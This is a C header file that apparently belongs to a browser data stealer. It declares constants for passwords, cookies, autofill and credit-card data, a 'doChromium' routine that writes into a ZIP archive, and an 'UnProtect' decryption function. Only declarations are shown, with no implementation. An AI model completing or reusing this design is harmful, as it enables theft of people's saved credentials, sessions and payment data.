#pragma once
#include <windows.h>
#include <shlwapi.h>
#include <stdint.h>
#include "Vector.h"
#include "SqlHandler.h"

#define TYPE_PASSWORDS 0x0010000
#define TYPE_COOKIES 0x0020000
#define TYPE_AUTOFILL 0x0030000
#define TYPE_CREDITS 0x0040000

void doChromium(HZIP zip, PCWCHAR db, DWORD* dwCount, INT dwMethod);
char* UnProtect(BYTE* pass, SIZE_T srclen, SIZE_T* out_len);